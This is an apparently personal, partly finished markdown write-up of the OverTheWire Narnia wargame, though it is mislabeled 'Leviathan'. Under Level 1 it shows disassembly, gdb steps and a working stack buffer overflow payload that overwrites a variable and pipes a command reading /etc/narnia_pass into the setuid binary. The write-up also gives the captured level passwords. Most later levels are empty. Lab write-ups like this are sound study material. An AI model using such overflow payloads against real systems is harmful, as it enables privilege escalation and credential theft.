## Leviathan
### Level 1:
 - Narnia’s levels are called narnia0, narnia1, … etc. and can be accessed on narnia.labs.overthewire.org through SSH.
 - Username: narnia0
 - Password: narnia0

```
Interesting, but irrelevant:
  400644:       e8 c7 fe ff ff          callq  400510 <__isoc99_scanf@plt>
  400649:       b8 f6 07 40 00          mov    $0x4007f6,%eax
  40064e:       48 8d 55 e0             lea    -0x20(%rbp),%rdx
  400652:       48 89 d6                mov    %rdx,%rsi
  400655:       48 89 c7                mov    %rax,%rdi
  400658:       b8 00 00 00 00          mov    $0x0,%eax
  40065d:       e8 5e fe ff ff          callq  4004c0 <printf@plt>
  400662:       b8 ff 07 40 00          mov    $0x4007ff,%eax
  400667:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
  40066b:       48 89 d6                mov    %rdx,%rsi
  40066e:       48 89 c7                mov    %rax,%rdi
  400671:       b8 00 00 00 00          mov    $0x0,%eax
  400676:       e8 45 fe ff ff          callq  4004c0 <printf@plt>
  40067b:       b8 ef be ad de          mov    $0xdeadbeef,%eax
  400680:       48 39 45 f8             cmp    %rax,-0x8(%rbp)
  400684:       75 11                   jne    400697 <main+0x93>
  400686:       bf 0c 08 40 00          mov    $0x40080c,%edi
  40068b:       e8 70 fe ff ff          callq  400500 <system@plt>
  400690:       b8 00 00 00 00          mov    $0x0,%eax
  400695:       c9                      leaveq 
  400696:       c3                      retq   
  400697:       bf 14 08 40 00          mov    $0x400814,%edi
  40069c:       e8 2f fe ff ff          callq  4004d0 <puts@plt>
  4006a1:       bf 01 00 00 00          mov    $0x1,%edi
  4006a6:       e8 35 fe ff ff          callq  4004e0 <exit@plt>
  4006ab:       90                      nop
  4006ac:       90                      nop
  4006ad:       90                      nop
  4006ae:       90                      nop
  4006af:       90                      nop


gdb na0
b *0x400649
display/i $pc
display/i val
display/s buf
set step-mode on
run < inp
print buf
print val
printf "%x\n", val

I had made it most of the way on my own, but not completely.  I was attempting to handle locally, but there is excessive buffer overflow protection written into my local gcc to get this to work, so I was stymied for a while.  The sleep ection in my solution with subsequent echo/cat didn't come until after I had followed: https://nsimattstiles.wordpress.com/2013/11/18/overthewire-narnia-level-0-4-writeup/

for the good stuff:
narnia0@melinda:/narnia$ (python -c'print "A"*20 + "\xef\xbe\xad\xde" + "\n" ; import sys ; sys.stdout.flush() ; import time ; time.sleep(3) ; print "cat /etc/narnia_pass/narnia1\n"') | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
efeidiedae
narnia0@melinda:/narnia$ 

here's the successful conclusion of my own effort:

narnia0@melinda:/narnia$ hexdump -C /tmp/inp
00000000  31 32 33 34 35 36 37 38  39 30 31 32 33 34 35 36  |1234567890123456|
00000010  37 38 39 30 ef be ad de  20 63 61 74 20 2f 65 74  |7890.... cat /et|
00000020  63 2f 6e 61 72 6e 69 61  5f 70 61 73 73 2f 6e 61  |c/narnia_pass/na|
00000030  72 6e 69 61 31 0a 0a                              |rnia1..|
00000037
narnia0@melinda:/narnia$ rm /tmp/inp
narnia0@melinda:/narnia$ (cat /tmp/inp ; sleep 2 ; echo cat /etc/narnia_pass/narnia1 ) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 12345678901234567890ﾭ�
val: 0xdeadbeef
efeidiedae

```

### Level 2:
 - Username: narnia1
 - Password: efeidiedae

```
narnia1@melinda:/narnia$ cat > /tmp/aret.c
#include <stdio.h>

int * myputc ()
{
        FILE *f=0;

        char *buf="abcdefghijklm";
        int i;

        for (i=0;i<10;i++) 
                 fputc(buf[i],stdout);

        return 0;
}
narnia1@melinda:/narnia$ gcc /tmp/aret.c -c -o/tmp/aret
Cannot create temporary file in ./: Permission denied
Aborted
narnia1@melinda:/narnia$ cd /tmp
narnia1@melinda:/tmp$ gcc -c /tmp/aret.c -o /tmp/aret



```



### Level 3:
 - Username: narnia2
 - Password: ougahZi8Ta

```
```


### Level 4:
 - Username: narnia3
 - Password: 

```
```


### Level 5:
 - Username: narnia4
 - Password: 

```
```



### Level 6:
 - Username: narnia5
 - Password: 


```
```



### Level 7:
 - Username: narnia6
 - Password: 


```
```



### Level 8:
 - Username: narnia7
 - Password: 

```
```
